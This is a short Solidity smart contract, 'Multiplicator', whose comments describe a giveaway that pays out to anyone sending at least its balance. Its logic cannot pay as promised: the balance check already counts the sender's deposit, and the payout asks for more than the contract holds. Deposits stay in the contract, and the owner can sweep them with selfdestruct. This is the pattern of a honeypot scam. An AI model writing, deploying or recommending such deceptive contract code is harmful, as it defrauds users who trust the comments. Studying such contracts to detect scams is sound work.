1 contract Multiplicator
2 {
3         //Gotta be generous sometimes
4         
5         address public Owner = msg.sender;
6         mapping (address => bool) winner; //keeping track of addresses that have already benefited
7         
8 
9 
10         function multiplicate(address adr) public payable
11         {
12             
13             if(msg.value>=this.balance)
14             {
15                 require(winner[msg.sender] == false);// every address can only benefit once, don't be greedy 
16                 winner[msg.sender] = true; 
17                 adr.transfer(this.balance+msg.value);
18             }
19         }
20         
21         function kill() {
22             require(msg.sender==Owner);
23             selfdestruct(msg.sender);
24          }
25          
26     //If you want to be generous you can just send ether to this contract without calling any function and others will profit by calling multiplicate
27     function () payable {}
28 
29 }